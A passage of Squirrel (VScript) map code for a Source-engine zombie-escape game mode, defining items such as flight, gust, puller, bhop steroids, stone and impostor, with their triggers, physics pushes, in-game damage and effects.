							if(!flapsound_cd)
							{
								flapsound_cd = true;
								EntFireByHandle(self,"RunScriptCode"," flapsound_cd = false; ",0.80,null,null);
								::Sound("*luffaren/dragon_wing.mp3",button.GetOrigin(),null,3000,0.40,RandomInt(100,200),10);
							}
							lastpos = button.GetOrigin();
							local mi = (0+::manager.GetScriptScope().mapspawnindex);
							local ds1 = (0.00+::ITEMS.flight.safedist_endbutton);
							local ds2 = (0.00+::ITEMS.flight.safedist_end);
							local ds3 = (0.00+::ITEMS.flight.safedist_finale_elevator);
							if(::finale_elevator_riding)
							{
								if(Entities.FindByNameNearest("block_finale_elevatormaster",user.GetOrigin()+Vector(0,0,32),ds3)!=null)
								{user.SetOrigin(Vector(0,0,-16160));user.SetVelocity(Vector());}
							}
							if(Entities.FindByNameNearest("block_"+mi.tostring()+"_endbutton",user.GetOrigin()+Vector(0,0,32),ds1)!=null)
							{user.SetOrigin(Vector(0,0,-16160));user.SetVelocity(Vector());}
							else
							{
								local endindicator = Entities.FindByNameNearest("block_"+mi.tostring()+"_endindicator",user.GetOrigin()+Vector(0,0,32),ds2);
								if(endindicator==null||!endindicator.IsValid()){}else
								{
									endindicator.ValidateScriptScope();
									if(!("endtriggered" in endindicator.GetScriptScope()) && !("buttontrigger_needed" in endindicator.GetScriptScope()))
									{
										user.SetOrigin(Vector(0,0,-16160));
										user.SetVelocity(Vector());
									}
								}
							}
						},function Run(){
							local pc = ::GetPlayerClass(user);
							if(pc==null)
							{
								EntFireByHandle(user,"SetHealth","",0.00,null,null);
								EntFireByHandle(button,"Kill","",0.00,null,null);
								return;
							}
							::ITEMS.flight.ListenTpBack(user);
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
							lastpos = button.GetOrigin();
						}});
				},
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/flight.mdl");
						::Ent(button.GetOrigin()-(button.GetForwardVector()*25)+Vector(0,0,-20),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/flight.mdl",
								rendermode = 1,
								modelscale = 3.00,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
							}});
					}
					else if(event==2)//pickup
					{
						if(::ENDINGS.CLIMB.ending_started)
						{
							::ENDINGS.CLIMB.FlightEnabled(user);
							EnableFlight(holder,button,user,event);
						}
					}
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						EnableFlight(holder,button,user,event);
						return true;
					}
				}},hammerid);
		}
	},
	gust = {
			team = 2,
			hammerid = 11,	//example: 1 (range 1-999)
			push_velocity = 400,
			push_velocity_up = 251,
			trigger_width = 32,
			trigger_depth = 32,		//__CSS__ og was 5, OBB is fucked though
			modelscale = 2.00,
			movespeed = 300,
			lifetime = 20.00,
			cooldown = 10.00,
			uses = 5,
		function Spawn(pos){
			::CreateItem(pos,Vector(),3,"Gust","("+cooldown+"s|"+uses.tostring()+"x)\n"+
					"Spawns a gust-projectile in your look-direction\nThe gust pushes humans away\nIt goes through walls",{
				cooldown = cooldown,
				model=null,
				uses = (0+uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/gust.mdl");
						::Ent(button.GetOrigin()+(button.GetForwardVector()*4)+Vector(0,0,-35),button.GetAngles()+Vector(0,0,0),"prop_dynamic",{
								model="models/luffaren/gust.mdl",
								modelscale = 0.70,
								rendermode = 3,
								rendercolor = "255 255 255",
								renderamt = 255,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = 0.00+cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","renderamt 50",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0",0.00,null,null);
						::EyeTrace(user,{function Run(player,dir,rot){
								::ITEMS.gust.SpawnGust(player.EyePosition(),rot,player);
							}});
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255",0.00,null,null);
					}
				}},hammerid);
		},
		function SpawnGust(pos,rot,user=null)
		{
			//::manager.PrecacheModel("models/luffaren/gust.mdl");
			::Ent(pos,rot+Vector(0,0,RandomFloat(0,360)),"prop_dynamic",{
					model="models/luffaren/gust.mdl",
					modelscale = (0.00+::ITEMS.gust.modelscale),
					rendermode = 3,
					renderamt = 200,
				},{
				sounds = [],
				user = user,
				function StopSounds(){
					foreach(s in sounds)
					{
						if(s==null||!s.IsValid())continue;
						EntFireByHandle(s,"StopSound","",0.00,null,null);
						EntFireByHandle(s,"Volume","0",0.00,null,null);
						EntFireByHandle(s,"Kill","",0.05,null,null);
					}
				},function Run(){
					::Sound("*luffaren/gust.mp3",Vector(),self,5000,::ITEMS.gust.lifetime+2.00,RandomInt(80,110),10
						{master=self,function Run(){master.GetScriptScope().sounds.push(soundhandle);}});
					::Sound("*luffaren/gust.mp3",Vector(),self,5000,::ITEMS.gust.lifetime+2.00,RandomInt(50,60),10
						{master=self,function Run(){master.GetScriptScope().sounds.push(soundhandle);}});
					::Sound("*luffaren/spork.mp3",Vector(),self,10000,1.00,RandomInt(95,102),10);
					::Ent(self.GetOrigin()-(self.GetForwardVector()*50),self.GetAngles(),"trigger_multiple",{
							spawnflags = 1,
							filtername = "filter_ct",
						},{
						master = self,
						currenthits = 0,
						user = user,
						function Tick(){
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.10,null,null);
							EntFireByHandle(self,"Disable","",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.02,null,null);
							::Ent(self.GetOrigin(),self.GetAngles()+Vector(0,0,RandomFloat(0,360)),"prop_dynamic",{
									model="models/luffaren/gust.mdl",
									modelscale = ((0.00+::ITEMS.gust.modelscale)*RandomFloat(0.80,0.95)),
									rendermode = 3,
									renderamt = 200,
								},{
								function Run(){
									//EntFireByHandle(self,"fadeandkill","1",0.00,null,null);
									::FadeAndKill(self,1.00);		//__CSS__ fadeandkill doesn't exist in css
								}});
						},function Touch(){
							local toucher = activator;	//__CSS__ activator may get reset, store toucher
							local newvel = ((self.GetForwardVector()*(0.00+::ITEMS.gust.push_velocity)));
							if(toucher.GetVelocity().z <= 1)newvel.z = (0+::ITEMS.gust.push_velocity_up);
							else newvel.z = toucher.GetVelocity().z;
							toucher.SetVelocity(newvel);
							::NullifyFalldownCheckpoint(toucher,user);
						},function Run(){
							EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							local w = ::ITEMS.gust.trigger_width.tostring();
							local d = ::ITEMS.gust.trigger_depth.tostring();
							EntFireByHandle(self,"AddOutput","mins -"+d+" -"+w+" -"+w+"",0.00,null,null);
							EntFireByHandle(self,"AddOutput","maxs "+d+" "+w+" "+w+"",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.02,null,null);
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
						}});
					local mrot = ""+self.GetAngles().x.tostring()+" "+self.GetAngles().y.tostring()+" "+self.GetAngles().z.tostring();
					::Ent(self.GetOrigin(),Vector(),"func_movelinear",{
							movedir = mrot,
							movedistance = 20000,
							speed = (0+::ITEMS.gust.movespeed),
							blockdamage = 999999,
							spawnflags = 8,
						},{
						master = self,
						function Run(){
							EntFireByHandle(master,"SetParent","!activator",0.00,self,null);
							EntFireByHandle(self,"Open","",0.02,null,null);
							EntFireByHandle(self,"AddOutput","OnUser1 !self:RunScriptCode:self.FirstMoveChild().GetScriptScope().StopSounds();:0:1",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnUser1 !self:Kill::0.10:1",0.00,null,null);
							EntFireByHandle(self,"AddOutput","targetname i_gust",0.10,null,null);
							EntFireByHandle(self,"FireUser1","",::ITEMS.gust.lifetime+0.05,null,null);
						}});
				}});
		},
	},
	puller = {
			team = 2,
			hammerid = 10,	//example: 1 (range 1-999)
			pull_velocity = 600,		//__CSS__ og was 500
			pull_velocity_up = 430,		//__CSS__ og was 400
			pull_delay = 2.00,
			damage = 21,
			cooldown = 10.00,
			uses = 5,
		function Spawn(pos){
			::CreateItem(pos,Vector(),3,"Puller","("+cooldown+"s|"+uses.tostring()+"x)\n"+
					"Spawns a long, thin beam in your look-direction\nThe beam pulls humans towards you\nIt pulls after "+pull_delay.tostring()+
					"s\nIt deals "+damage.tostring()+"dmg on-pull",{
				cooldown = cooldown,
				model=null,
				uses = (0+uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/planetcrystal.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-32),button.GetAngles()+Vector(-90,0,0),"prop_dynamic",{
								model="models/luffaren/planetcrystal.mdl",
								modelscale = 0.80,
								rendermode = 3,
								rendercolor = "50 0 80",
								renderamt = 200,
								glowenabled = 1,
								glowstyle = 1,
								glowdist = 5000,
								glowcolor = "255 0 0",
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = 0.00+cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","renderamt 40",0.00,null,null);
						EntFireByHandle(model,"AddOutput","glowcolor 30 0 0",0.00,null,null);
						::EyeTrace(user,{function Run(player,dir,rot){
								//::manager.PrecacheModel("models/luffaren/puller.mdl");
								::Ent(player.EyePosition(),rot,"prop_dynamic",{
										model="models/luffaren/puller.mdl",
										modelscale = 4.00,
										rendermode = 1,
										renderamt = 150,
										glowenabled = 1,
										glowdist = 50000,
										glowstyle = 1,
										glowcolor = "80 20 50",
									},{
									user = player,
									function RunHit(){
										EntFireByHandle(self,"AddOutput","modelscale 8",0.00,null,null);
										EntFireByHandle(self,"AddOutput","glowcolor 255 255 0",0.00,null,null);
										local ii=0.00;
										for(local alpha=255;alpha>0;alpha-=10)
										{
											EntFireByHandle(self,"AddOutput","glowcolor "+alpha.tostring()+" "+alpha.tostring()+" 0",ii,null,null);
											EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
											ii+=0.02;
										}
										EntFireByHandle(self,"Kill","",ii,null,null);
										
										
										//__CSS__ OOB trigger rotation is fucked (replacement logic):
										::TriggerScan(self.GetOrigin(),self.GetAngles(),Vector(0,-20,-20),Vector(10000,20,20),		//__CSS__ larger trigger too
											"filter_ct",{user=user,prop=self,function Scanned(list){
												foreach(toucher in list)
												{
													local newvel = ((prop.GetForwardVector()*-(0.00+::ITEMS.puller.pull_velocity)));
													newvel.z = (0+::ITEMS.puller.pull_velocity_up);
													toucher.SetVelocity(newvel);
													::NullifyFalldownCheckpoint(toucher,user);
													::Sound("*luffaren/whip_me_daddy.mp3",toucher.GetOrigin()+Vector(0,0,40),null,5000,0.02,RandomInt(70,110),10);
													::Particle("muzzle_rifles",toucher.GetOrigin()+Vector(0,0,40),Vector(),null,0.03);
													::HurtPlayer(toucher,::ITEMS.puller.damage,prop.GetOrigin()+(prop.GetForwardVector()*10000)+
														Vector(0,0,-100),RandomInt(300,400),user,"bignades");
												}
											}},false,10000);	//10k unit long trigger, performance-heavy
										
										
										//__CSS__ OOB trigger rotation is fucked (old logic):
										/*
										::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
												spawnflags = 1,
												filtername = "filter_ct",
											},{
											user = user,
											function Touch(){
												local toucher = activator;	//__CSS__ activator may get reset, store toucher
												local newvel = ((self.GetForwardVector()*-(0.00+::ITEMS.puller.pull_velocity)));
												newvel.z = (0+::ITEMS.puller.pull_velocity_up);
												toucher.SetVelocity(newvel);
												::NullifyFalldownCheckpoint(toucher,user);
												::Sound("*luffaren/whip_me_daddy.mp3",toucher.GetOrigin()+Vector(0,0,40),null,5000,0.02,RandomInt(70,110),10);
												::Particle("muzzle_rifles",toucher.GetOrigin()+Vector(0,0,40),Vector(),null,0.03);
												::HurtPlayer(toucher,::ITEMS.puller.damage,self.GetOrigin()+(self.GetForwardVector()*10000)+
													Vector(0,0,-100),RandomInt(300,400),user,"bignades");
											},function Run(){
												EntFireByHandle(self,"AddOutput","mins 0 -8 -8",0.00,null,null);
												EntFireByHandle(self,"AddOutput","maxs 10000 8 8",0.00,null,null);
												EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
												EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
												EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
												EntFireByHandle(self,"Enable","",0.02,null,null);
												EntFireByHandle(self,"Kill","",0.40,null,null);		//was 0.20 in v1_5
											}});
										*/
										
										

									},function Run(){
										EntFireByHandle(self,"RunScriptCode"," RunHit(); ",::ITEMS.puller.pull_delay,null,null);
										::Sound("*luffaren/puller.mp3",self.GetOrigin(),null,100000,2.50,RandomInt(98,102),10);
										::Sound("*luffaren/get_over_here.mp3",self.GetOrigin(),null,100000,1.00,RandomInt(80,110),10);
										
										::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{
												model="models/luffaren/puller.mdl",
												modelscale = 3.00,
												rendermode = 0,
												renderamt = 255,
												rendercolor = "255 255 0",
												renderfx = 11,
											},{
											master = self,
											function Run(){
												self.AcceptInput("SetParent","!activator",this.master,null);
											}});
										
									}});
							}});
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 200",0.00,null,null);
						EntFireByHandle(model,"AddOutput","glowcolor 255 0 0",0.00,null,null);
					}
				}},hammerid);
		}
	},
	bhop_steroids = {
			team = 3,
			hammerid = 9,	//example: 1 (range 1-999)
			jump_xyvel = 500,
			jump_zvel = 320,
			tickrate = 0.01,
			ray_upper = 2,
			ray_lower = -2,
			ray_outer = 14,
			fuel = 30.00,
			fuel_insta_drain_on_enable = 2.00,
		function Spawn(pos){
			::CreateItem(pos,Vector(),1,"BhopSteroids","("+fuel+"f)\nInject yourself with steroids\nfor automatic bunnyhopping!"+
					"\nLimited/fuel-like usage\nToggle it on/off with +use/E\n"+fuel_insta_drain_on_enable.tostring()+"f insta-drains on each activation"+
					"\nYou can clear a 4-tile gap from the edge",{
				fuel = 0.00+fuel,
				model=null,
				ticking = false,
				playing = false,
				playing_last = false,
				soundhandle = null,
				function KillSound()
				{
					if(soundhandle==null||!soundhandle.IsValid()){}else
					{
						EntFireByHandle(soundhandle,"Volume","0",0.00,null,null);
						EntFireByHandle(soundhandle,"StopSound","",0.00,null,null);
						EntFireByHandle(soundhandle,"Kill","",0.02,null,null);
					}
				},
				function Tick()
				{
					if(!ticking)
					{
						EntFireByHandle(button,"Kill","",0.00,null,null);
						KillSound();
						return;
					}
					EntFireByHandle(holder,"RunScriptCode"," logic.Tick(); ",::ITEMS.bhop_steroids.tickrate,null,null);
					if(playing)
					{
						fuel-=(::ITEMS.bhop_steroids.tickrate+((ceil(::ITEMS.bhop_steroids.tickrate/FrameTime()))*FrameTime()-::ITEMS.bhop_steroids.tickrate));
						if(fuel<=0.00)
						{
							ticking=false;
							return;
						}
						if(soundhandle==null||!soundhandle.IsValid()){}else
							EntFireByHandle(soundhandle,"Pitch","100",0.00,null,null);
						local user = holder.GetMoveParent();
						if(user==null||!user.IsValid()||user.IsAlive()==false||user.GetTeam()!=3){KillSound();playing=false;}else
						{
							if(user.GetVelocity().z < 0.05)
							{
								local tracehit = false;
								local traces = [Vector(0,0,0),Vector(-::ITEMS.bhop_steroids.ray_outer,0,0),Vector(::ITEMS.bhop_steroids.ray_outer,0,0),
												Vector(0,-::ITEMS.bhop_steroids.ray_outer,0),Vector(0,::ITEMS.bhop_steroids.ray_outer,0)];
								foreach(t in traces)
								{
									if(TraceLinePlayersIncluded(user.GetOrigin()+t+
										Vector(0,0,::ITEMS.bhop_steroids.ray_upper),user.GetOrigin()+t+
										Vector(0,0,::ITEMS.bhop_steroids.ray_lower),user)<1.00)
										{
											tracehit = true;
											break;
										}
								}
								if(tracehit)
									user.SetVelocity((user.GetForwardVector()*::ITEMS.bhop_steroids.jump_xyvel)+
										Vector(0,0,::ITEMS.bhop_steroids.jump_zvel));
							}
						}
					}
					if(playing != playing_last)
					{
						playing_last = playing;
						KillSound();
						if(playing)
						{
							fuel -= ::ITEMS.bhop_steroids.fuel_insta_drain_on_enable;
							::Sound("*luffaren/bhop_steroids.mp3",Vector(),button,1000,40.00,100,10,{
								steroids_logic = this,
								function Run(){
									steroids_logic.soundhandle = soundhandle;
								}});
							local user = holder.GetMoveParent();
							if(user==null||!user.IsValid()||user.IsAlive()==false||user.GetTeam()!=3){}else
							{
								::Ent(user.GetOrigin()+Vector(0,0,4),Vector(),"env_spritetrail",{
										lifetime = 0.30,
										startwidth = 20,
										endwidth = 0.01,
										rendermode = 5,
										rendercolor = "100 100 100",
										renderamt = 100,
										spritename = "sprites/physbeam.vmt",
									},{
									master = soundhandle,
									user = user,
									function Tick(){
										if(master==null||!master.IsValid())
										{
											EntFireByHandle(self,"Kill","",0.00,null,null);
											return;
										}
										EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.02,null,null);
										
										self.SetLocalOrigin(Vector(0,0,4));
										//EntFireByHandle(self,"setlocalorigin","0 0 4",0.00,null,null);
									},function Run(){
										if(master==null||!master.IsValid())
										{
											EntFireByHandle(self,"Kill","",0.00,null,null);
											return;
										}
										EntFireByHandle(self,"SetScale","1.00",0.02,null,null);
										EntFireByHandle(self,"ShowSprite","",0.02,null,null);
										EntFireByHandle(self,"SetParent","!activator",0.00,user,null);
										EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.02,null,null);
									}});
							}
						}
					}
				},
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/bhop_steroids.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-40),button.GetAngles()+Vector(0,180,0),"prop_dynamic",{
								model="models/luffaren/bhop_steroids.mdl",
								rendermode = 1,
								modelscale = 0.90,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{	
						if(::ITEMS.squid.PlayerInked(user))
						{
							playing = false;
							button.GetScriptScope().cooldown = 0.04;
							return;
						}
						button.GetScriptScope().cooldown = 0.20;
						playing = !playing;
						if(!ticking)
						{
							ticking = true;
							Tick();
						}
						return true;
					}
					//else if(event==6){}//ready
				}},hammerid);
		}
	},
	stone = {
			team = 2,
			hammerid = 8,	//example: 1 (range 1-999)
			cooldown = 3.00,
			uses = 10,
			thrust_force = 20000,
			thrust_time = 0.10,
			pitch_offset = -5,
			clean_time = 5.00,
			damage = 29,
			hits_stops_velocity = true,
			print_deaths = true,
		nameindex = 0,
		function Spawn(pos){
			::CreateItem(pos,Vector(),3,"Stone","("+cooldown.tostring()+"s|"+uses.tostring()+"x)\nThrow a stone that damages humans"+
				"\nIt throws towards your look-direction\nDeals "+damage.tostring()+" damage on-hit",{
				model = null,
				uses = (0+::ITEMS.stone.uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/stone.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-32),Vector(RandomInt(0,360),RandomInt(0,360),RandomInt(0,360)),"prop_dynamic",{
								model="models/luffaren/stone.mdl",
								modelscale = 0.75,
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					else if(event==2)//pickup
					{
						EntFireByHandle(user,"AddOutput","health "+::Z_ITEM_HP.tostring(),0.00,null,null);
					}
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = 0.00+::ITEMS.stone.cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 150",0.00,null,null);
						::EyeTrace(user,{function Run(player,dir,rot){
								::ITEMS.stone.SpawnStone(player.EyePosition(),rot,player);
							}});
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
					}
				}},hammerid);
		},
		function SpawnStone(pos,rot,user=null)
		{
			::ITEMS.stone.nameindex++;
			local nindex = (0+::ITEMS.stone.nameindex).tostring();
			//::manager.PrecacheModel("models/luffaren/stone.mdl");
			::Ent(pos,Vector(RandomInt(0,360),RandomInt(0,360),RandomInt(0,360)),"prop_physics_override",{
					targetname = "i_item_stone_"+nindex,
					model="models/luffaren/stone.mdl",
					spawnflags = 6,
					nodamageforces = 1,
					solid = 5,
					DisableBoneFollowers = true,
				},{
				user = user,
				nindex = nindex,
				rot = rot,
				gottakill = false,
				lastpos = Vector(),
				function Tick(){
					if(gottakill)
					{
						EntFireByHandle(self,"Kill","",0.00,null,null);
						return;
					}
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.30,null,null);
					local disdif = ::GetDistance(lastpos,self.GetOrigin());
					if(disdif <= 10)gottakill = true;
					lastpos = self.GetOrigin();
				},function Run(){
					lastpos = self.GetOrigin();
					::Sound("*ambient/wind/wind_snippet5.wav",Vector(),self,20000,0.50,RandomInt(240,255),10);
					EntFireByHandle(self,"RunScriptCode","self.SetSolid(5);",0.00,null,null);
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.30,null,null);
					EntFireByHandle(self,"RunScriptCode"," gottakill=true; ",::ITEMS.stone.clean_time,null,null);
					local thrust_angles = ""+(rot.x+::ITEMS.stone.pitch_offset).tostring()+" "+rot.y.tostring()+" "+rot.z.tostring();
					
					self.SetPhysVelocity(::AnglesToDir(rot) * ::ITEMS.stone.thrust_force);		//__CSS__ praise the new function that actually works!!!
					/*
					::Ent(self.GetOrigin(),Vector(),"phys_thruster",{
							attach1 = "i_item_stone_"+nindex,
							forcetime = 0,
							force = (0.00+::ITEMS.stone.thrust_force),
							spawnflags = 50,
							angles = thrust_angles,
						},{
						master = self,
						function Run(){
							master.__KeyValueFromString("targetname","i_item_stone");
							::ITEMS.stone.nameindex--;
							EntFireByHandle(self,"Activate","",0.00,null,null);
							EntFireByHandle(self,"Kill","",::ITEMS.stone.thrust_time,null,null);
						}});
					*/
					
					
					
					
					::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
							spawnflags = 1,
							filtername = "filter_ct",
						},{
						user = user,
						model = self,
						touchers = [],
						function Touch(){
							local toucher = activator;	//__CSS__ activator may get reset, store toucher
							foreach(t in touchers){if(t==toucher)return;}
							touchers.push(toucher);
							local newhp = (toucher.GetHealth()-(::ITEMS.stone.damage * ::HURTPLAYER_mult_ct));
							if(newhp>0)
								EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
							else
							{
								::HurtPlayer(toucher,999999,self.GetOrigin(),RandomInt(200,400),user,"stone");
								if(::ITEMS.stone.print_deaths)
									::PlayerNameMessage(toucher,""," got stoned to death!",0.00);
							}
							if(::ITEMS.stone.hits_stops_velocity)
							{
								local vel = toucher.GetVelocity();
								vel.x = 0;
								vel.y = 0;
								if(vel.z > 0)vel.z = 0;
								toucher.SetVelocity(vel);
								::NullifyFalldownCheckpoint(toucher,user);		//NEW IN v1_9 - falling down due to this will cause deaths
							}
							::Sound("*luffaren/punch.mp3",self.GetOrigin(),null,1000,0.02,RandomInt(120,200),10);
							::Particle("muzzle_rifles",self.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.03);
						},
						function Think(){
							//self.AcceptInput("Toggle","",null,null);
							//return -1;
						},function Run(){
							//AddThinkToEnt(self,"Think");
							//EntFireByHandle(self,"SetParent","!activator",0.00,model,null);
							//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							//EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							
							//EntFireByHandle(self,"AddOutput","mins -5 -5 -5",0.00,null,null);
							//EntFireByHandle(self,"AddOutput","maxs 5 5 5",0.00,null,null);
							
							self.AcceptInput("SetParent","!activator",model,null);		//__CSS__ nope i was a fuckup, this shit fixed it, insta-parent
							//self.SetSize(Vector(-20,-20,-20),Vector(20,20,20));		//__CSS__ why are triggers so fucked in css, they can miss people when moving fast
							self.SetSize(Vector(-5,-5,-5),Vector(5,5,5));
							self.SetCollisionGroup(10);
							self.SetSolid(2);
							
							
							
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.01,null,null);
						}});
					::Ent(self.GetOrigin(),Vector(),"env_spritetrail",{
							lifetime = 0.30,
							startwidth = 20,
							endwidth = 0.01,
							rendermode = 5,
							rendercolor = "100 100 100",
							renderamt = 100,
							spritename = "sprites/physbeam.vmt",
						},{
						model = self,
						function Run(){
							EntFireByHandle(self,"SetScale","1.00",0.02,null,null);
							EntFireByHandle(self,"ShowSprite","",0.02,null,null);
							//EntFireByHandle(self,"SetParent","!activator",0.00,model,null);
							self.AcceptInput("SetParent","!activator",model,null);
						}});
				}});
		}
	},
	impostor = {
			team = 2,
			hammerid = 7,	//example: 1 (range 1-999)
			hidden_time = 15.00,
			invincible_time = 5.00,
			hpcap_base = 50,
			hpcap_each = 15,
			illusion_amount = 10,
			enabled = true,			//set to 'false' to kill the item on-pickup			//IMPOSTOR_DISABLED_V1_3 > RE_ENABLED_IN_V1_6
			//force_model = "models/player/custom_player/luffaren/playercheap_ct.mdl",	//set model path to force-set specific model instead of majority-bias(null) (example: "models/player/custom_player/xxxx/playermodel.mdl")
			force_model = null,	//__CSS__ just yoink an existing model
			force_model_blacklist = [],													//fill this array with models to blacklist, if problematic ("models/player/.../modelname.mdl")
		active_count = 0,
		function Spawn(pos){
			
			
			::CreateItem(pos,Vector(),3,"Impostor","(1x)\nTP to humans in human form for "+hidden_time.tostring()+"s"+
				"\n(with "+invincible_time.tostring()+"s start-invincibility)"+
				"\nYou cannot infect humans while in human form"+
				"\n(humans can damage you though)"+
				"\nYour hp is capped until you die - good luck",{
			//__CSS__ game_text char limit, old below(v), new above(^)
			/*
			::CreateItem(pos,Vector(),3,"Impostor","(1x)\nTake human form for "+hidden_time.tostring()+"s"+
				"\nYou teleport to a random human on-use"+
				"\n(with "+invincible_time.tostring()+"s invincibility)"+
				"\nYou cannot infect humans while in human form"+
				"\n(humans can damage you though)"+
				"\nOnce your form reverts you can infect humans"+
				"\n(infected humans get TP'd back)"+
				"\nYour hp is dynamically capped until you die"+
				"\n",{
			*/	
				
				model = null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/captain_planet.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-50),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/captain_planet.mdl",
								rendermode = 1,
								renderamt = 150,
								glowenabled = 1,
								glowdist = 2000,
								glowstyle = 1,
								glowcolor = "255 255 255",
								modelscale = 0.15,
								rendercolor = "255 0 0",
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
							}});
					}
					else if(event==2)//pickup
					{
						if(!::ITEMS.impostor.enabled)
							EntFireByHandle(button,"Kill","",0.00,null,null);
						else
